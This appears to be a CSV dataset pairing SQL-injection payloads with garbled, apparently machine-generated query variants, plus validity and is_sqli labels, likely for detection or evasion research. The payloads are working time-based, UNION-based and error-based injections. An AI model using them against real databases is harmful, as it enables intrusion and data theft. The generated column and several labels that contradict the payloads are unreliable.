original_query,generated_query,validity,is_sqli
1'  )   waitfor delay '0:0:5' and   (  'fpnh'  =  'fpnh,SELECT MIN(sql injection) FROM SQL_injection,1,0
"1""  )   union all select null,null,null,null,null,null#","SELECT null,null,null FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL",1,1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#","SELECT MIN(USER()) FROM SQL, SELECT SELECT FROM @@VERSION,SLEEP(5),USER(), SELECT FROM SQL, SELECT SELECT SELECT 'evade SQL injection' FROM SQL",0,1
INSERT INTO Documents WHERE ID=x,SELECT query: SELECT SQL FROM documents WHERE ID = 'evade detection',1,0
1 and   (  1977  =  6852  )  *6852-- clxl,"SELECT *6852-- clxl FROM query: 1 AND NOT SQL_inject = ""valid""",1,1
"1""   )    )    as gqxk where 9199  =  9199 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#","SELECT 6880,6880,6880,6880,6880 FROM SQL_Injection WHERE NOT 6880,6880,6880,6880,6880# ='sq injection'",1,1
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1
1 where 4641  =  4641,SELECT * FROM query: 1 WHERE NOT SQL_injection = 4641,1,0
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,SELECT * FROM * FROM * FROM users WHERE NOT id = 1 OR $ OR 1 = 1,1,1
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'zurf'  =  'zurf","SELECT MIN(5000000,md5) FROM SQL_injection WHERE NOT'sq injection' IN (SELECT MIN(5000000,md5) FROM benchmark WHERE ((((zurf) = 'evade sq injection')",1,1
"1""  )   where 1144  =  1144 and 2006  =  2006",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1
1'   )    )    and 6690  =  3250#,SELECT MIN(#3) FROM SQL injection,1,0
-8828%'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  '%'  =  ',SELECT MIN(SQL) FROM SQL - SELECT MIN(SQL) FROM SQL - SELECT MIN(SQL) FROM SQL,1,1
"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",SELECT MIN(sleep) FROM SQL injection,1,0
"1'||  (  select 'jfxs' from dual where 5485  =  5485 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql ) FROM SQL - SELECT jfxs FROM SQL WHERE 5485 = 5485 AND NOT char( 109 ) ||char ( 90 ),1,1
